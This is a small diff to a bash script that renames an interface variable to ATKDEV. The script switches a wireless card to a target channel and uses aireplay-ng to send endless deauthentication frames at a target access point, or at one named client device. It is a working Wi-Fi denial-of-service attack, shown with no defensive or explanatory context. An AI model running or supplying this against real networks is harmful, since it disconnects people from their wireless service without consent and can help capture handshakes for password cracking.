@@ -2,12 +2,12 @@
 
 source ./config.cfg
 
-iwconfig $MONA channel $TARGET_CHANNEL
+iwconfig $ATKDEV channel $TARGET_CHANNEL
 
 if [ -z "$TARGET_DEVICE" ]
 then
-    aireplay-ng -0 0 -a $TARGET_BSSID $MONA --ignore-negative-one
+    aireplay-ng -0 0 -a $TARGET_BSSID $ATKDEV --ignore-negative-one
 else
-    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $MONA --ignore-negative-one
+    aireplay-ng -0 0 -a $TARGET_BSSID -c $TARGET_DEVICE $ATKDEV --ignore-negative-one
 fi
 
